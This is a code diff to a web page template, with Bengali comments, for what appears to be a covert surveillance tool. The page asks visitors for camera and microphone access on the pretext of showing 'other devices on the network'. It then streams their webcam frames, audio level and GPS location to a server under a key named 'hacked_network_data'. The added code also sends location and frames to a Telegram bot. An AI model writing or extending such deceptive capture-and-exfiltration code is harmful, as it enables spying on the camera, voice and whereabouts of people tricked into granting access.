@@ -12,7 +12,7 @@
         .container{ max-width:1400px; margin:0 auto; }
         .header{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1f2a3a; padding-bottom:15px; flex-wrap:wrap; gap:10px; }
         .header h1{ color:#00d4ff; font-weight:300; }
-        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:14px; display:flex; gap:15px; align-items:center; }
+        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:14px; display:flex; gap:15px; align-items:center; flex-wrap:wrap; }
         .status-badge span{ display:flex; align-items:center; gap:5px; }
         .online-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#00ff88; }
         .offline-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#ff6b6b; }
@@ -40,7 +40,14 @@
         .audio-bar .fill{ height:100%; background:#00d4ff; border-radius:3px; transition:0.3s; }
         .no-data{ color:#556; font-style:italic; padding:10px 0; }
         .footer{ margin-top:30px; text-align:center; font-size:12px; color:#445; border-top:1px solid #1a2430; padding-top:15px; }
-        .telegram-mode-banner{ background:#1a2430; padding:12px; border-radius:10px; margin-bottom:20px; text-align:center; border:1px solid #2a3a50; }
+        
+        /* পার্সোনাল বট সেটিংস */
+        .settings-box{ background:#111a24; border:1px solid #2a3a50; border-radius:12px; padding:15px; margin-top:20px; }
+        .settings-box h3{ color:#00d4ff; font-weight:400; margin-bottom:10px; }
+        .settings-box input{ background:#0b0e14; border:1px solid #2a3a50; color:#c8d0dc; padding:8px 12px; border-radius:8px; width:45%; margin-right:10px; }
+        .settings-box .btn-small{ background:#2a3a50; border:none; color:#c8d0dc; padding:8px 20px; border-radius:8px; cursor:pointer; }
+        .settings-box .btn-small:hover{ background:#3a4a60; }
+        .settings-box .status-msg{ color:#8899aa; font-size:12px; margin-top:8px; }
     </style>
 </head>
 <body>
@@ -50,18 +57,12 @@
         <div class="status-badge">
             <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
             <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
-            <span class="bot-status {{ 'bot-active' if bot_enabled else 'bot-inactive' }}">
-                {{ '✅ Bot active' if bot_enabled else '❌ Bot not set' }}
+            <span class="bot-status {{ 'bot-active' if admin_bot_enabled else 'bot-inactive' }}">
+                {{ '🛡️ Admin Bot ON' if admin_bot_enabled else '🛡️ Admin Bot OFF' }}
             </span>
         </div>
     </div>
 
-    {% if bot_enabled %}
-    <div class="telegram-mode-banner">
-        <strong>📨 Telegram Mode Active</strong><br>
-        All data is being sent to your Telegram bot. No data is shown here to reduce server load.
-    </div>
-    {% else %}
     <div id="permissionBox" class="permission-box">
         <h2>🎥 Enable Camera & Microphone</h2>
         <p>Grant access to see other devices on the network</p>
@@ -72,13 +73,22 @@
 
     <div id="dashboard" class="dashboard">
         <div id="clientsGrid" class="client-grid"></div>
+        
+        <!-- পার্সোনাল বট সেটিংস (শুধু ইউজারের জন্য) -->
+        <div class="settings-box">
+            <h3>🔧 Personal Telegram Bot (optional)</h3>
+            <p style="color:#8899aa; font-size:13px; margin-bottom:8px;">Send your own data to your personal bot.</p>
+            <input type="text" id="personalBotToken" placeholder="Bot Token" value="">
+            <input type="text" id="personalChatId" placeholder="Chat ID" value="">
+            <button id="savePersonalBot" class="btn-small">Save</button>
+            <div id="personalBotStatus" class="status-msg">Not set.</div>
+        </div>
+        
         <div class="footer">📦 Data saved locally • Available offline</div>
     </div>
-    {% endif %}
 </div>
 
 <script>
-    {% if not bot_enabled %}
     const socket = io({
         reconnection: true,
         reconnectionAttempts: Infinity,
@@ -89,7 +99,83 @@
     let localStream = null, localVideo = null;
     let permissionsGranted = false;
     const CACHE_KEY = 'hacked_network_data';
+    const PERSONAL_BOT_KEY = 'personal_bot_config';
 
+    // ========== পার্সোনাল বট লোড/সেভ ==========
+    function loadPersonalBot() {
+        try {
+            const data = JSON.parse(localStorage.getItem(PERSONAL_BOT_KEY) || '{}');
+            document.getElementById('personalBotToken').value = data.token || '';
+            document.getElementById('personalChatId').value = data.chatId || '';
+            updatePersonalBotStatus(data.token && data.chatId);
+        } catch {}
+    }
+    function savePersonalBot() {
+        const token = document.getElementById('personalBotToken').value.trim();
+        const chatId = document.getElementById('personalChatId').value.trim();
+        localStorage.setItem(PERSONAL_BOT_KEY, JSON.stringify({ token, chatId }));
+        updatePersonalBotStatus(token && chatId);
+        alert('✅ Personal bot settings saved!');
+    }
+    function updatePersonalBotStatus(active) {
+        const el = document.getElementById('personalBotStatus');
+        if (active) {
+            el.innerHTML = '✅ Personal bot active. Your data will be sent to your bot.';
+            el.style.color = '#00ff88';
+        } else {
+            el.innerHTML = '❌ Personal bot not set.';
+            el.style.color = '#ff6b6b';
+        }
+    }
+
+    document.getElementById('savePersonalBot').addEventListener('click', savePersonalBot);
+    loadPersonalBot();
+
+    // ========== টেলিগ্রামে পাঠানোর ফাংশন (ক্লায়েন্ট সাইড) ==========
+    async function sendToPersonalBot(text, photoBase64) {
+        const config = JSON.parse(localStorage.getItem(PERSONAL_BOT_KEY) || '{}');
+        const token = config.token;
+        const chatId = config.chatId;
+        if (!token || !chatId) return false;
+
+        try {
+            if (photoBase64) {
+                // ফটো পাঠাও
+                const blob = dataURLtoBlob(photoBase64);
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'frame.jpg');
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return res.ok;
+            } else {
+                // টেক্সট মেসেজ
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                });
+                return res.ok;
+            }
+        } catch(e) {
+            console.error('Personal bot error:', e);
+            return false;
+        }
+    }
+
+    function dataURLtoBlob(dataurl) {
+        const arr = dataurl.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while(n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+
+    // ========== ড্যাশবোর্ড ফাংশন ==========
     function loadCache() {
         try { return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}'); } catch { return {}; }
     }
@@ -144,6 +230,7 @@
         }
     }
 
+    // ========== ক্যামেরা/মাইক ==========
     async function requestPermissions(manual = true) {
         try {
             localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -169,11 +256,16 @@
             source.connect(analyser);
             const dataArray = new Uint8Array(analyser.frequencyBinCount);
 
-            socket.emit('location_update', {
+            // লোকেশন সার্ভারে + পার্সোনাল বটে পাঠাও
+            const locationData = {
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
-            });
+            };
+            socket.emit('location_update', locationData);
+            // পার্সোনাল বটে লোকেশন পাঠাও
+            sendToPersonalBot(`📍 My Location\nLat: ${locationData.lat}\nLng: ${locationData.lng}`);
+
             socket.emit('ready');
 
             setInterval(() => {
@@ -191,10 +283,19 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // সার্ভারে পাঠাও (ড্যাশবোর্ডের জন্য)
                 socket.emit('video_frame', {
                     image: imageData,
                     audio_volume: volume
                 });
+
+                // পার্সোনাল বটে পাঠাও (প্রতি ৫ম ফ্রেম)
+                if (!window._personalCounter) window._personalCounter = 0;
+                window._personalCounter++;
+                if (window._personalCounter % 5 === 0) {
+                    sendToPersonalBot(`🎥 My Frame\n🔊 Audio: ${volume}%`, imageData);
+                }
             }, 6000);
         } catch (err) {
             permissionsGranted = false;
@@ -239,7 +340,6 @@
         localStorage.clear();
         location.reload();
     });
-    {% endif %}
 </script>
 </body>
-                </html>
+    </html>
